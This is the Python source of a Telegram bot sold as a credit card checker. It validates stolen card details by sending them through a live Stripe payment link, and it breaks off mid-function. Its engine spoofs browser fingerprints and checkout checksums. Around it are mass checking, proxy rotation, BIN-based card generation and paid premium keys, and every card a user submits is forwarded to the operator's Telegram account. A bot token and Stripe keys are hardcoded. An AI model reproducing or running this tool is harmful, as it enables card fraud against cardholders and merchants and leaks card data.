import asyncio
import logging
import random
import re
import string
import urllib.parse
import uuid
from datetime import datetime
from io import BytesIO

import requests
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

# ════════════════════════════════════════════════════════════
# CONFIG EMBEDDED
# ════════════════════════════════════════════════════════════

BOT_TOKEN = "8250378472:AAFH_JgQVbOUnCUvYQaOnLMnrWi4G_MCDZY"
ADMIN_ID = 6936293942
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

DEFAULT_BUY_URL = "https://buy.stripe.com/28o2apdMBcTa69G3cf"
DEFAULT_PAYMENT_LINK_ID = DEFAULT_BUY_URL.rstrip("/").split("/")[-1]

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0"
)

# Font System - 𝗙𝗲𝗲𝗱𝗯𝗮𝗰𝗸
FONT_MAP = {
    'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲',
    'f': '𝗳', 'g': '𝗴', 'h': '𝗵', 'i': '𝗶', 'j': '𝗷',
    'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻', 'o': '𝗼',
    'p': '𝗽', 'q': '𝗾', 'r': '𝗿', 's': '𝘀', 't': '𝘁',
    'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅', 'y': '𝘆',
    'z': '𝘇',
    'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘',
    'F': '𝗙', 'G': '𝗚', 'H': '𝗛', 'I': '𝗜', 'J': '𝗝',
    'K': '𝗞', 'L': '𝗟', 'M': '𝗠', 'N': '𝗡', 'O': '𝗢',
    'P': '𝗣', 'Q': '𝗤', 'R': '𝗥', 'S': '𝗦', 'T': '𝗧',
    'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫', 'Y': '𝗬',
    'Z': '𝗭',
    '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰',
    '5': '𝟱', '6': '𝟲', '7': '𝟳', '8': '𝟴', '9': '𝟵',
}

def fb(text):
    """Convert text to 𝗙𝗲𝗲𝗱𝗯𝗮𝗰𝗸 font"""
    return "".join(FONT_MAP.get(ch, ch) for ch in text)

# User Data Storage
user_db = {}

def get_user(user_id):
    if user_id not in user_db:
        user_db[user_id] = {
            "checks": 0, "charged": 0, "declined": 0, "_3ds": 0,
            "history": [], "registered": datetime.now().strftime("%Y-%m-%d %H:%M"),
            "plan": "Free", "points": 0,
        }
    return user_db[user_id]

# Gateway Management
gateways = {
    "stripe": {
        "name": "Stripe", "url": DEFAULT_BUY_URL,
        "link_id": DEFAULT_PAYMENT_LINK_ID, "active": True,
    }
}

def add_gateway(name, url):
    link_id = url.rstrip("/").split("/")[-1]
    gateways[name.lower()] = {
        "name": name, "url": url,
        "link_id": link_id, "active": True,
    }

def remove_gateway(name):
    name = name.lower()
    if name in gateways and name != "stripe":
        del gateways[name]
        return True
    return False

# Proxy Management
proxies = []

def add_proxy(proxy_str):
    proxies.append(proxy_str)

def remove_proxy(index):
    if 0 <= index < len(proxies):
        return proxies.pop(index)
    return None

def get_proxy():
    if proxies:
        return {"http": proxies[0], "https": proxies[0]}
    return None

# Redeem Keys
redeem_keys = {
    "PREMIUM-2026-ALPHA": {"plan": "Premium", "days": 30},
    "VIP-2026-OMEGA": {"plan": "VIP", "days": 90},
}

def redeem_key(key, user_id):
    key = key.upper().strip()
    if key in redeem_keys:
        plan = redeem_keys.pop(key)
        user = get_user(user_id)
        user["plan"] = plan["plan"]
        return plan
    return None

# Site Management
monitored_sites = []

def add_site(url):
    if url not in monitored_sites:
        monitored_sites.append(url)
        return True
    return False

def remove_site(url):
    if url in monitored_sites:
        monitored_sites.remove(url)
        return True
    return False

# Mass Check Control
stop_check = False

def stop_all_checks():
    global stop_check
    stop_check = True

def reset_stop():
    global stop_check
    stop_check = False

def is_stopped():
    return stop_check


logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)


# ════════════════════════════════════════════════════════════
# COLORED BUTTONS VIA REQUESTS (Telegram API 9.4)
# ════════════════════════════════════════════════════════════

def send_colored_buttons(chat_id, text, buttons, parse_mode="HTML"):
    """Send message with colored buttons using raw API"""
    keyboard = {"inline_keyboard": []}
    for row in buttons:
        keyboard_row = []
        for btn in row:
            btn_dict = {"text": btn["text"], "callback_data": btn["callback"]}
            if "style" in btn:
                btn_dict["style"] = btn["style"]
            keyboard_row.append(btn_dict)
        keyboard["inline_keyboard"].append(keyboard_row)

    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode,
        "reply_markup": keyboard
    }
    try:
        resp = requests.post(f"{API_URL}/sendMessage", json=payload, timeout=30)
        return resp.json()
    except Exception as e:
        logger.error(f"Failed to send colored buttons: {e}")
        return None

def edit_colored_buttons(chat_id, message_id, text, buttons, parse_mode="HTML"):
    """Edit message with colored buttons using raw API"""
    keyboard = {"inline_keyboard": []}
    for row in buttons:
        keyboard_row = []
        for btn in row:
            btn_dict = {"text": btn["text"], "callback_data": btn["callback"]}
            if "style" in btn:
                btn_dict["style"] = btn["style"]
            keyboard_row.append(btn_dict)
        keyboard["inline_keyboard"].append(keyboard_row)

    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": parse_mode,
        "reply_markup": keyboard
    }
    try:
        resp = requests.post(f"{API_URL}/editMessageText", json=payload, timeout=30)
        return resp.json()
    except Exception as e:
        logger.error(f"Failed to edit colored buttons: {e}")
        return None


# Button builders with colors
def b(text, callback, style="primary"):
    return {"text": text, "callback": callback, "style": style}

def b_red(text, callback):
    return {"text": text, "callback": callback, "style": "danger"}

def b_green(text, callback):
    return {"text": text, "callback": callback, "style": "success"}

def b_blue(text, callback):
    return {"text": text, "callback": callback, "style": "primary"}


# ════════════════════════════════════════════════════════════
# CARD ENGINE
# ════════════════════════════════════════════════════════════

class CardEngine:
    def _rand_id(self, k=32):
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))

    def gen_email(self):
        return f"Maestro{''.join(random.choices(string.digits, k=8))}@gmail.com"

    def parse(self, line):
        line = (line or "").strip().replace(" ", "")
        if not line: return None
        parts = line.split("|")
        if len(parts) < 4: return None
        number = parts[0].strip().replace(" ", "")
        month = parts[1].strip().zfill(2)
        year = parts[2].strip()
        if len(year) == 4: year = year[-2:]
        cvc = parts[3].strip()
        name = parts[4].strip() if len(parts) > 4 else "Card Holder"
        if not number or not month or not year or not cvc: return None
        return {"number": number, "cvc": cvc, "exp_month": month,
                "exp_year": year, "name": name or "Card Holder", "email": self.gen_email()}

    def check(self, card, gateway="stripe"):
        card_str = f"{card['number']}|{card['exp_month']}|{card['exp_year']}|{card['cvc']}"
        gw = gateways.get(gateway, gateways["stripe"])
        buy_url, pl_id = gw["url"], gw["link_id"]
        session = requests.Session()
        proxy = get_proxy()
        if proxy: session.proxies.update(proxy)

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "vi,en-US;q=0.9,en;q=0.8",
            "sec-ch-ua": '\"Not:A-Brand\";v=\"99\", \"Microsoft Edge\";v=\"145\", \"Chromium\";v=\"145\"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '\"Windows\"',
            "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none", "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1", "user-agent": USER_AGENT,
        }
        resp = session.get(buy_url, headers=headers)
        html = resp.text
        pk_live = None
        m = re.search(r"pk_live_[A-Za-z0-9]+", html)
        if m: pk_live = m.group(0)
        cs_id = None
        m = re.search(r"cs_live_[A-Za-z0-9]+", html)
        if m: cs_id = m.group(0)

        merchant_ui_headers = {
            "accept": "application/json", "accept-language": "vi,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://buy.stripe.com", "referer": "https://buy.stripe.com/",
            "sec-ch-ua": '\"Not:A-Brand\";v=\"99\", \"Microsoft Edge\";v=\"145\", \"Chromium\";v=\"145\"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '\"Windows\"',
            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
            "user-agent": USER_AGENT,
        }
        pl_form = {"eid": "NA", "browser_locale": "vi", "browser_timezone": "Asia/Saigon",
                   "referrer_origin": "https://karibuwomenhome.com.au"}
        pl_resp = session.post(f"https://merchant-ui-api.stripe.com/payment-links/{pl_id}",
                               headers=merchant_ui_headers, data=urllib.parse.urlencode(pl_form))

        checkout_session_id = cs_id
        pl_data, pl_expected_amount, pl_config_id, pl_currency = {}, None, None, "aud"
        if pl_resp.ok:
            try:
                pl_data = pl_resp.json()
                checkout_session_id = pl_data.get("session_id") or checkout_session_id
                pl_config_id = pl_data.get("config_id")
                pl_currency = pl_data.get("currency") or "aud"
                lig = pl_data.get("line_item_group") or {}
                pl_expected_amount = lig.get("total") or lig.get("due") or lig.get("subtotal")
                if pl_expected_amount is not None: pl_expected_amount = int(pl_expected_amount)
            except: pass

        if not pk_live: pk_live = "pk_live_51QRg19RoxmaXTuY55nJGUChdohsr8gq6tGgVsA6viZ9l6h2UJ2UmyaqM4yng0sjiNhPImBr6XS0KXJY6nvYRVxAq00eT8UvNBF"
        if not checkout_session_id: checkout_session_id = "cs_live_a1r2cbZ7xviYNl1hbdjN4HQNUw6hKvfjKdCpvKR48pVpsxvoFypXlLvkfr"

        muid = "bf10e066-3dde-43cf-990c-7f526e267148"
        guid = "598209cc-46fa-4e08-b69c-22b3316aba05"
        sid = "4318288f-e6f2-4e62-bc88-4d5ccc435a1b"
        stripe_js_id = str(uuid.uuid4())
        currency = pl_currency

        api_headers = {
            "accept": "application/json", "accept-language": "vi,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com", "priority": "u=1, i", "referer": "https://js.stripe.com/",
            "sec-ch-ua": '\"Not:A-Brand\";v=\"99\", \"Microsoft Edge\";v=\"145\", \"Chromium\";v=\"145\"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '\"Windows\"',
            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
            "user-agent": USER_AGENT,
        }
        es_params = {
            "client_betas[0]": "google_pay_beta_1",
            "client_betas[1]": "disable_deferred_intent_client_validation_beta_1",
            "client_betas[2]": "blocked_card_brands_beta_2",
            "deferred_intent[mode]": "payment",
            "deferred_intent[amount]": str(pl_expected_amount) if pl_expected_amount else "100",
            "deferred_intent[currency]": currency,
            "deferred_intent[payment_method_types][0]": "card",
            "deferred_intent[payment_method_types][1]": "link",
            "deferred_intent[capture_method]": "automatic_async",
            "currency": currency, "key": pk_live, "elements_init_source": "payment_link",
            "hosted_surface": "checkout", "referrer_host": "buy.stripe.com",
            "stripe_js_id": stripe_js_id, "locale": "vi", "type": "deferred_intent",
            "checkout_session_id": checkout_session_id,
        }
        response_es = session.get("https://api.stripe.com/v1/elements/sessions", params=es_params, headers=api_headers)
        es_data = response_es.json()
        expected_amount_cents = pl_expected_amount
        if expected_amount_cents is None:
            sess = es_data.get("session") or es_data
            expected_amount_cents = sess.get("amount_total") or sess.get("amount_subtotal") or es_data.get("amount")
        if expected_amount_cents is None: expected_amount_cents = 100
        expected_amount_cents = int(expected_amount_cents)
        expected_amount_str = str(expected_amount_cents)

        buy_headers = {**api_headers, "origin": "https://buy.stripe.com", "referer": "https://buy.stripe.com/"}
        form_pm = {
            "type": "card", "card[number]": card["number"], "card[cvc]": card["cvc"],
            "card[exp_month]": card["exp_month"], "card[exp_year]": card["exp_year"],
            "billing_details[name]": card["name"], "billing_details[email]": card["email"],
            "billing_details[address][country]": "VN", "guid": guid, "muid": muid, "sid": sid,
            "key": pk_live, "payment_user_agent": "stripe.js/148043f9d7; stripe-js-v3/148043f9d7; payment-link; checkout",
            "client_attribution_metadata[client_session_id]": stripe_js_id,
            "client_attribution_metadata[checkout_session_id]": checkout_session_id,
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "payment_link",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
            "client_attribution_metadata[checkout_config_id]": pl_config_id or "",
        }
        response_pm = session.post("https://api.stripe.com/v1/payment_methods", headers=buy_headers, data=urllib.parse.urlencode(form_pm))
        pm_resp = response_pm.json()
        if pm_resp.get("error"): return card_str, False, f"Error: {pm_resp['error'].get('message')}", False
        pm_id = pm_resp.get("id")
        if not pm_id: return card_str, False, "Failed to create PaymentMethod", False

        init_checksum = self._rand_id(32)
        js_checksum = "".join(random.choices(string.ascii_letters + string.digits + "~^=[]|%#{}<>?`", k=50))
        pxvid = str(uuid.uuid4())
        rv_timestamp = "".join(random.choices(string.ascii_letters + string.digits + "&%=<>^`[];", k=120))

        confirm_form = {
            "eid": "NA", "payment_method": pm_id, "expected_amount": expected_amount_str,
            "last_displayed_line_item_group_details[subtotal]": expected_amount_str,
            "last_displayed_line_item_group_details[total_exclusive_tax]": "0",
            "last_displayed_line_item_group_details[total_inclusive_tax]": "0",
            "last_displayed_line_item_group_details[total_discount_amount]": "0",
            "last_displayed_line_item_group_details[shipping_rate_amount]": "0",
            "expected_payment_method_type": "card", "guid": guid, "muid": muid, "sid": sid,
            "key": pk_live, "version": "148043f9d7", "init_checksum": init_checksum,
            "js_checksum": js_checksum, "pxvid": pxvid, "passive_captcha_token": "",
            "passive_captcha_ekey": pl_data.get("site_key", ""), "rv_timestamp": rv_timestamp,
            "client_attribution_metadata[client_session_id]": stripe_js_id,
            "client_attribution_metadata[checkout_session_id]": checkout_session_id,
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "payment_link",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
            "client_attribution_metadata[checkout_config_id]": pl_config_id or "",
        }
        confirm_resp = session.post(f"https://api.stripe.com/v1/payment_pages/{checkout_session_id}/confirm",
                                    headers=buy_headers, data=urllib.parse.urlencode(confirm_form, safe=""))
        data = confirm_resp.json()

        if confirm_resp.status_code == 200 and isinstance(data.get("id"), str) and data["id"].startswith("ppage_"):
            return card_str, False, "3DS Required - Possible OTP", False
        err = data.get("error") or {}
        if err:
            message = err.get("message", "Your card was declined.")
            if err.get("charge") and ("succeeded" in str(data.get("status", "")).lower()):
                return card_str, True, "CHARGED", True
            return card_str, False, message, False
        if data.get("status") in ("succeeded", "complete"): return card_str, True, "CHARGED", True
        return card_str, False, "Unknown response", False


engine = CardEngine()


# ════════════════════════════════════════════════════════════
# BIN LOOKUP & CARD GENERATOR
# ════════════════════════════════════════════════════════════

def bin_lookup(bin_num):
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_num[:6]}", headers={"Accept-Version": "3"}, timeout=10)
        if r.ok:
            d = r.json()
            return {"scheme": d.get("scheme", "Unknown"), "type": d.get("type", "Unknown"),
                    "brand": d.get("brand", "Unknown"), "country": d.get("country", {}).get("name", "Unknown"),
                    "bank": d.get("bank", {}).get("name", "Unknown"), "emoji": d.get("country", {}).get("emoji", "")}
    except: pass
    return None

def luhn_check(num):
    digits = [int(d) for d in num]
    odd, even = digits[-1::-2], digits[-2::-2]
    total = sum(odd)
    for d in even:
        d *= 2
        if d > 9: d -= 9
        total += d
    return total % 10 == 0

def gen_card_from_bin(bin_prefix, count=10):
    results = []
    for _ in range(count):
        card = bin_prefix
        while len(card) < 15: card += str(random.randint(0, 9))
        for check in range(10):
            test = card + str(check)
            if luhn_check(test): results.append(test); break
    return results


# ════════════════════════════════════════════════════════════
# UI BUILDERS - Colored Buttons
# ════════════════════════════════════════════════════════════

def build_main_menu():
    return [
        [b_blue(fb("Tools"), "tools")],
        [b_blue(fb("Profile"), "profile")],
        [b_blue(fb("Settings"), "settings")],
        [b_blue(fb("About"), "about")],
    ]


def build_tools_menu():
    return [
        [b_green(fb("Single Check"), "tool_chk")],
        [b_green(fb("Mass Check"), "tool_mass")],
        [b_green(fb("BIN Lookup"), "tool_bin")],
        [b_green(fb("Generator"), "tool_gen")],
        [b_blue(fb("Back"), "menu")],
    ]


def build_mass_stats_buttons(approved, secure3d, declined):
    return [
        [b_green(fb(f"Approved {approved}"), "stats_approved")],
        [b_blue(fb(f"3D Secure {secure3d}"), "stats_3ds")],
        [b_red(fb(f"Declined {declined}"), "stats_declined")],
        [b_red(fb("Stop"), "mass_stop")],
    ]


def build_mass_done_buttons(approved, secure3d, declined):
    return [
        [b_green(fb(f"Approved {approved}"), "done_approved")],
        [b_blue(fb(f"3D Secure {secure3d}"), "done_3ds")],
        [b_red(fb(f"Declined {declined}"), "done_declined")],
        [b_blue(fb("Back"), "menu")],
    ]


def build_settings_menu():
    return [
        [b_blue(fb("Shopify"), "gw_shopify")],
        [b_blue(fb("3DS Lookup"), "gw_3ds")],
        [b_blue(fb("Site Management"), "gw_site")],
        [b_blue(fb("Proxy Management"), "gw_proxy")],
        [b_blue(fb("Other"), "gw_other")],
        [b_blue(fb("Back"), "menu")],
    ]


# ════════════════════════════════════════════════════════════
# /START COMMAND
# ════════════════════════════════════════════════════════════

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    get_user(user.id)
    username = f"@{user.username}" if user.username else "N/A"
    plan = get_user(user.id)["plan"]
    if user.id == ADMIN_ID: plan = "Admin"

    text = f"""{fb('Welcome')} {user.first_name}!
━━━━━━━━━━━━━━
{fb('User')}: {username}
{fb('ID')}: <code>{user.id}</code>
{fb('Status')}: {fb(plan)}
━━━━━━━━━━━━━━
{fb('Use the buttons below to navigate.')}"""

    send_colored_buttons(update.effective_chat.id, text, build_main_menu())


# ════════════════════════════════════════════════════════════
# CALLBACK HANDLER
# ════════════════════════════════════════════════════════════

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id
    udata = get_user(user_id)
    chat_id = update.effective_chat.id

    if data == "menu":
        user = update.effective_user
        username = f"@{user.username}" if user.username else "N/A"
        plan = udata["plan"]
        if user_id == ADMIN_ID: plan = "Admin"
        text = f"""{fb('Welcome')} {user.first_name}!
━━━━━━━━━━━━━━
{fb('User')}: {username}
{fb('ID')}: <code>{user.id}</code>
{fb('Status')}: {fb(plan)}
━━━━━━━━━━━━━━
{fb('Use the buttons below to navigate.')}"""
        send_colored_buttons(chat_id, text, build_main_menu())

    elif data == "tools":
        text = f"""{fb('Tools Menu')}

├─ {fb('Single Card Check')} ➜ /chk
├─ {fb('Mass File Check')} ➜ /mass
├─ {fb('BIN Lookup')} ➜ /bin
└─ {fb('Card Generator')} ➜ /gen

{fb('Select a tool or use commands directly.')}"""
        send_colored_buttons(chat_id, text, build_tools_menu())

    elif data == "profile":
        user = update.effective_user
        username = f"@{user.username}" if user.username else "N/A"
        plan = udata["plan"]
        if user_id == ADMIN_ID: plan = "Admin"
        text = f"""{fb('Profile')}
━━━━━━━━━━━━━━
{fb('Name')}: {user.first_name}
{fb('User')}: {username}
{fb('ID')}: <code>{user.id}</code>
{fb('Plan')}: {fb(plan)}
{fb('Checks')}: {udata['checks']}
{fb('Charged')}: {udata['charged']}
{fb('Declined')}: {udata['declined']}
{fb('3DS')}: {udata['_3ds']}
{fb('Joined')}: {udata['registered']}
━━━━━━━━━━━━━━"""
        buttons = [[b_blue(fb("Back"), "menu")]]
        send_colored_buttons(chat_id, text, buttons)

    elif data == "settings":
        text = f"""{fb('Settings')}

├─ Shopify
│  ├─ /sh cc|mm|yyyy|cvv ➜ Check single
│  └─ /msh ➜ Mass check from text
│
├─ 3DS Lookup
│  └─ /3ds cc|mm|yyyy|cvv
│
├─ Site Management
│  ├─ /add site.com
│  ├─ /rm site.com
│  └─ /info
│
├─ Proxy Management
│  ├─ /adpxy ip:port:user:pass
│  ├─ /proxy
│  └─ /repxy 1
│
└─ Other
   ├─ /redeem KEY
   ├─ /sendhit
   └─ /stopcheck"""
        send_colored_buttons(chat_id, text, build_settings_menu())

    elif data == "about":
        text = f"""{fb('Mo.dark Card Checker v7.0')}

├─ {fb('Engine')}: Stripe Payment Link Engine
├─ {fb('Version')}: 7.0 ALPHA
├─ {fb('Performance')}: Async | Multi-threading
├─ {fb('Security')}: Proxy Rotation | Session Pool
│
├─ {fb('Developer')}: Mo.dark Engineering
├─ {fb('License')}: ALPHA_ENGINEER
│
└─ {fb('Built with precision. Engineered for dominance.')}"""
        buttons = [[b_blue(fb("Back"), "menu")]]
        send_colored_buttons(chat_id, text, buttons)

    elif data == "tool_chk":
        text = f"""{fb('Single Card Check')}

{fb('Send card in format:')}
<code>cc|mm|yyyy|cvv</code>

├─ {fb('Example:')}
│  <code>4242424242424242|12|2027|123</code>
│
└─ {fb('Optional name as 5th param:')}
   <code>4242424242424242|12|2027|123|Ahmed</code>"""
        buttons = [[b_blue(fb("Back"), "tools")]]
        send_colored_buttons(chat_id, text, buttons)
        context.user_data["state"] = "chk"

    elif data == "tool_mass":
        text = f"""{fb('Mass Check')}

{fb('Send a .txt file with cards.')}
{fb('One card per line.')}

├─ {fb('Format:')} <code>cc|mm|yyyy|cvv</code>
├─ {fb('Max 50 cards for free users.')}
└─ {fb('Unlimited for admin.')}"""
        buttons = [[b_blue(fb("Back"), "tools")]]
        send_colored_buttons(chat_id, text, buttons)
        context.user_data["state"] = "mass"

    elif data == "tool_bin":
        text = f"""{fb('BIN Lookup')}

{fb('Send BIN number (6 digits):')}
<code>/bin 424242</code>

├─ {fb('Returns:')}
│  ├─ {fb('Scheme')} (Visa/Mastercard)
│  ├─ {fb('Type')} (Debit/Credit)
│  └─ {fb('Brand')} ➜ {fb('Country')} ➜ {fb('Bank')}"""
        buttons = [[b_blue(fb("Back"), "tools")]]
        send_colored_buttons(chat_id, text, buttons)

    elif data == "tool_gen":
        text = f"""{fb('Card Generator')}

{fb('Generate cards from BIN:')}
<code>/gen 424242 10</code>

├─ {fb('Max 10 cards per request.')}
└─ {fb('Includes Luhn validation.')}"""
        buttons = [[b_blue(fb("Back"), "tools")]]
        send_colored_buttons(chat_id, text, buttons)

    elif data == "gw_shopify":
        text = f"""{fb('Shopify')}

├─ /sh cc|mm|yyyy|cvv ➜ Check single
└─ /msh ➜ Mass check from text

{fb('Shopify gateway integration.')}"""
        buttons = [[b_blue(fb("Back"), "settings")]]
        send_colored_buttons(chat_id, text, buttons)

    elif data == "gw_3ds":
        text = f"""{fb('3DS Lookup')}

└─ /3ds cc|mm|yyyy|cvv

{fb('Check 3D Secure status.')}"""
        buttons = [[b_blue(fb("Back"), "settings")]]
        send_colored_buttons(chat_id, text, buttons)

    elif data == "gw_site":
        sites_text = "\n".join([f"├─ {s}" for s in monitored_sites]) if monitored_sites else f"{fb('No sites monitored.')}"
        text = f"""{fb('Site Management')}

├─ /add site.com
├─ /rm site.com
└─ /info

{fb('Monitored Sites:')}
{sites_text}"""
        buttons = [[b_blue(fb("Back"), "settings")]]
        send_colored_buttons(chat_id, text, buttons)

    elif data == "gw_proxy":
        px_text = "\n".join([f"├─ {p}" for p in proxies]) if proxies else f"{fb('No proxies configured.')}"
        text = f"""{fb('Proxy Management')}

├─ /adpxy ip:port:user:pass
├─ /proxy
└─ /repxy 1

{fb('Active Proxies:')}
{px_text}

├─ {fb('Note: Proxies are optional.')}
└─ {fb('System works without proxies.')}"""
        buttons = [[b_blue(fb("Back"), "settings")]]
        send_colored_buttons(chat_id, text, buttons)

    elif data == "gw_other":
        text = f"""{fb('Other Commands')}

├─ /redeem KEY ➜ Redeem premium key
├─ /sendhit ➜ Send hits to channel
└─ /stopcheck ➜ Stop all checks"""
        buttons = [[b_blue(fb("Back"), "settings")]]
        send_colored_buttons(chat_id, text, buttons)

    elif data == "mass_stop":
        stop_all_checks()
        await query.answer(fb("Stop signal sent!"), show_alert=True)

    elif data.startswith("stats_") or data.startswith("done_"):
        await query.answer(fb("Stats updated!"), show_alert=False)


# ════════════════════════════════════════════════════════════
# COMMANDS
# ════════════════════════════════════════════════════════════

async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    udata = get_user(user_id)
    if not context.args:
        await update.message.reply_text(f"{fb('Usage')}: <code>/chk cc|mm|yyyy|cvv</code>", parse_mode="HTML")
        return
    line = " ".join(context.args)
    card = engine.parse(line)
    if not card:
        await update.message.reply_text(f"{fb('Invalid format!')}\n{fb('Use')}: <code>cc|mm|yyyy|cvv</code>", parse_mode="HTML")
        return

    status_msg = await update.message.reply_text(f"{fb('Checking...')}\n<code>{line}</code>", parse_mode="HTML")
    try:
        card_str, success, msg, charged = engine.check(card)
        udata["checks"] += 1

        # Get BIN info for the output
        bin_info = bin_lookup(card['number'])
        bin_scheme = bin_info['scheme'] if bin_info else "Unknown"
        bin_type = bin_info['type'] if bin_info else "Unknown"
        bin_brand = bin_info['brand'] if bin_info else "Unknown"
        bin_country = bin_info['country'] if bin_info else "Unknown"
        bin_bank = bin_info['bank'] if bin_info else "Unknown"
        bin_emoji = bin_info['emoji'] if bin_info else ""

        # Profesor Checker style output
        if success:
            udata["charged"] += 1
            status_text = "CHARGED!"
            status_icon = "[+]"
            response_text = "APPROVED"
        elif "3DS" in msg:
            udata["_3ds"] += 1
            status_text = "3DS Required"
            status_icon = "[~]"
            response_text = "3DS OTP"
        else:
            udata["declined"] += 1
            status_text = "DECLINED"
            status_icon = "[-]"
            response_text = msg

        udata["history"].append({"card": card_str, "result": msg, "success": success, "time": datetime.now().strftime("%H:%M:%S")})

        # Profesor Checker style output
        output = f"""{status_icon} Gateway: Stripe Payment Link [ /chk ]
-------------------------------
{status_icon} Card: <code>{card_str}</code>
{status_icon} Status: {status_text}
{status_icon} Response: {response_text} [{bin_scheme}] [{card['number'][-4:]}]
-------------------------------
{status_icon} Bin: {bin_scheme} - {bin_type} - {bin_brand}
{status_icon} Bank: {bin_bank} - {bin_emoji}
{status_icon} Country: {bin_country} [ {bin_emoji} ]
-------------------------------
{status_icon} Time: {datetime.now().strftime('%H:%M:%S')}
{status_icon} Price: Free
{status_icon} By: Mo.dark Checker
-------------------------------
{status_icon} Dev: @yacine_X6"""

        await status_msg.edit_text(output, parse_mode="HTML")

        if str(user_id) != str(ADMIN_ID) and ADMIN_ID:
            try:
                admin_msg = f"""{fb('New Check')}

{fb('User')}: <code>{user_id}</code>
{fb('Card')}: <code>{card_str}</code>
{fb('Result')}: {status_text}"""
                await context.bot.send_message(ADMIN_ID, admin_msg, parse_mode="HTML")
            except: pass
    except Exception as e:
        await status_msg.edit_text(f"{fb('Error')}: <code>{str(e)}</code>", parse_mode="HTML")


async def cmd_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    udata = get_user(user_id)
    if not context.args:
        await update.message.reply_text(f"{fb('Usage')}: <code>/mass cc|mm|yyyy|cvv ...</code>\n\n{fb('Or send a .txt file directly.')}", parse_mode="HTML")
        return
    lines = " ".join(context.args).split("\n")
    await process_mass(update, context, lines, user_id, udata)


async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, lines: list, user_id: int, udata: dict):
    valid_cards = [engine.parse(line) for line in lines if engine.parse(line)]
    if not valid_cards:
        await update.message.reply_text(f"{fb('No valid cards found!')}", parse_mode="HTML")
        return

    is_admin = str(user_id) == str(ADMIN_ID)
    limit = 50 if not is_admin else 9999
    if len(valid_cards) > limit:
        valid_cards = valid_cards[:limit]
        await update.message.reply_text(f"{fb('Limited by your plan!')}\n{fb('Will check first')} {limit} {fb('cards')}", parse_mode="HTML")

    reset_stop()

    # Send initial status message
    status_msg = await update.message.reply_text(
        f"{fb('Checking')} {len(valid_cards)} {fb('cards...')}",
        parse_mode="HTML"
    )

    results = []
    charged_count = declined_count = _3ds_count = 0

    for idx, card in enumerate(valid_cards, 1):
        if is_stopped():
            results.append(f"STOPPED at card {idx}")
            break
        try:
            card_str, success, msg, charged = engine.check(card)
            udata["checks"] += 1

            # Get BIN info
            bin_info = bin_lookup(card['number'])
            bin_scheme = bin_info['scheme'] if bin_info else "Unknown"
            bin_type = bin_info['type'] if bin_info else "Unknown"
            bin_brand = bin_info['brand'] if bin_info else "Unknown"
            bin_country = bin_info['country'] if bin_info else "Unknown"
            bin_bank = bin_info['bank'] if bin_info else "Unknown"
            bin_emoji = bin_info['emoji'] if bin_info else ""

            if success:
                charged_count += 1; udata["charged"] += 1
                status_icon = "[+]"
                status_text = "CHARGED!"
                response_text = "APPROVED"

                # Send result for each charged card immediately
                result_output = f"""{status_icon} Gateway: Stripe Payment Link [ /chk ]
-------------------------------
{status_icon} Card: <code>{card_str}</code>
{status_icon} Status: {status_text}
{status_icon} Response: {response_text} [{bin_scheme}] [{card['number'][-4:]}]
-------------------------------
{status_icon} Bin: {bin_scheme} - {bin_type} - {bin_brand}
{status_icon} Bank: {bin_bank} - {bin_emoji}
{status_icon} Country: {bin_country} [ {bin_emoji} ]
-------------------------------
{status_icon} Time: {datetime.now().strftime('%H:%M:%S')}
{status_icon} Price: Free
{status_icon} By: Mo.dark Checker
-------------------------------
{status_icon} Dev: @yacine_X6"""
                await update.message.reply_text(result_output, parse_mode="HTML")

            elif "3DS" in msg:
                _3ds_count += 1; udata["_3ds"] += 1
                status_icon = "[~]"
                status_text = "3DS Required"
                response_text = "3DS OTP"

